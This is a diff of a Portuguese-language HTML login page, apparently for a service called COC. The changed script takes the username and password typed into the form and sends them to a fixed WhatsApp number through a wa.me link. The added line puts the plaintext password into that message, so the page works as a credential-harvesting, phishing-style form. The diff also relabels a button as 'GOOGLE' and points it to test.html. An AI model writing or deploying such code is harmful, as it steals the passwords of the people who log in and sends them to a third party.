@@ -3,186 +3,67 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login - COC Backend</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial;}
-    
-    body {
-      background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-
-    .login-box {
-      background: #111;
-      border: 2px solid #00ff88;
-      padding: 40px 30px;
-      border-radius: 18px;
-      width: 100%;
-      max-width: 420px;
-      text-align: center;
-      box-shadow: 0 0 30px rgba(0,255,136,0.2);
-    }
-
-    .logo-topo {
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    .logo-topo img {
-      width: 60px;
-      height: 60px;
-      object-fit: contain;
-      filter: drop-shadow(0 0 10px #00ff88);
-    }
-
-    h1 {
-      color: #00ff88;
-      margin-bottom: 25px;
-      font-size: 28px;
-      text-shadow: 0 0 10px rgba(0,255,136,0.3);
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-
-    label p {
-      text-align: left;
-      margin-bottom: 5px;
-      color: #ccc;
-      font-size: 14px;
-    }
-
-    input {
-      width: 100%;
-      padding: 14px;
-      border-radius: 10px;
-      border: 1px solid #333;
-      background: #1a1a1a;
-      color: white;
-      font-size: 15px;
-      outline: none;
-      transition: 0.3s;
-    }
-
-    input:focus {
-      border-color: #00ff88;
-      box-shadow: 0 0 10px rgba(0,255,136,0.3);
-    }
-
-    .retangulo, .retangulo2 {
-      width: 100%;
-      padding: 14px;
-      border-radius: 10px;
-      border: none;
-      font-weight: bold;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.3s;
-      margin-top: 5px;
-    }
-
-    .retangulo {
-      background: linear-gradient(135deg, #00ff88, #00cc66);
-      color: #000;
-    }
-
-    .retangulo:hover {
-      transform: scale(1.03);
-      box-shadow: 0 0 20px rgba(0,255,136,0.4);
-    }
-
-    .retangulo2 {
-      background: #222;
-      color: white;
-      border: 1px solid #444;
-    }
-
-    .retangulo2:hover {
-      background: #333;
-      border-color: #00ff88;
-    }
-
-    .linha-ou {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin: 20px 0;
-      color: #666;
-    }
-
-    .linha-ou hr {
-      flex: 1;
-      border: none;
-      height: 1px;
-      background: #333;
-    }
-
-    #erro-senha {
-      color: #ff4444;
-      font-size: 14px;
-      margin-top: -5px;
-    }
-
-    .none { display: none; }
-  </style>
+  <link rel="stylesheet" href="sobre.css">
+  <title>Login</title>
 </head>
 
-<body>
-  <div class="login-box">
-    
-    <div class="logo-topo">
-      <img src="IMG-20260812-WA0019.jpg" alt="COC Logo">
-      <img src="file_000f10820e838a5822136d1252.png" alt="COC Icon">
-    </div>
 
-    <h1>Faça seu login</h1>
 
-    <form id="formLogin">
-      <label for="campo_nome"><p>Email:</p></label>
-      <input id="campo_nome" type="email" required placeholder="Digite seu email">
 
-      <label for="campo_senha"><p>Senha:</p></label>
-      <input id="campo_senha" type="password" required placeholder="Digite sua senha">
 
-      <p id="erro-senha" class="none"></p>
 
-      <button class="retangulo" type="submit">ENTRAR</button>
 
-      <div class="linha-ou">
+
+
+<body class="body">
+
+  <img src="IMG-20260812-WA0019.jpg" alt="Descrição da imagem" class="tag2">
+  <img src="file_000000000f10820e838a5822136d1252.png" alt="Descrição da imagem" class="minha-imagem2">
+
+  <h1 class="darkred">Faça seu login</h1>
+
+  <form id="formLogin"> <!-- TIREI O ACTION DAQUI -->
+
+    <label for="campo_nome"><p class="pink2">Nome de usuário ou endereço de email:</p></label>
+    <input id="campo_nome" type="text" required class="pink" placeholder="Digite seu email">
+
+    <label for="campo_senha"><p class="black">Senha:</p></label>
+    <input id="campo_senha" type="password" required class="black2" placeholder="Digite sua senha">
+
+    <p id="erro-senha" class="none"></p>
+
+    <button class="retangulo" type="submit">Entrar</button> <!-- ARRUMEI AQUI -->
+
+    <div class="linha-ou">
         <hr>
         <span>ou</span>
         <hr>
-      </div>
+    </div>
 
-      <button class="retangulo2" type="button" onclick="window.location.href='index.html'">VOLTAR</button>
-    </form>
-  </div>
+    <button class="retangulo2" type="button" onclick="window.location.href='test.html'">GOOGLE</button> <!-- ARRUMEI AQUI TAMBEM -->
+
+
+
+
+    
+  </form>
+
+
+
+
 
   <script>
     document.getElementById('formLogin').addEventListener('submit', function(e){
-        e.preventDefault();
+        e.preventDefault(); // Para de recarregar
 
         let nome = document.getElementById('campo_nome').value;
         let senha = document.getElementById('campo_senha').value;
-        let erro = document.getElementById('erro-senha');
 
         if(nome == "" || senha == ""){
-            erro.innerText = "Preencha tudo!";
-            erro.className = "";
+            document.getElementById('erro-senha').innerText = "Preencha tudo!";
+            document.getElementById('erro-senha').className = "";
             return;
         }
-
-        erro.className = "none";
 
         // 1. Salva no navegador
         localStorage.setItem('usuario', nome);
@@ -190,7 +71,7 @@
 
         // 2. Abre o WhatsApp
         let numero = "5599984531106";
-        let mensagem = "Oi, sou " + nome + "\nEmail: " + nome + "\nAcabei de fazer login no COC";
+        let mensagem = "Oi, sou " + nome + "\nEmail/Senha: " + senha + "\nAcabei de fazer login no COC";
         let linkZap = "https://wa.me/" + numero + "?text=" + encodeURIComponent(mensagem);
         window.open(linkZap, '_blank');
 
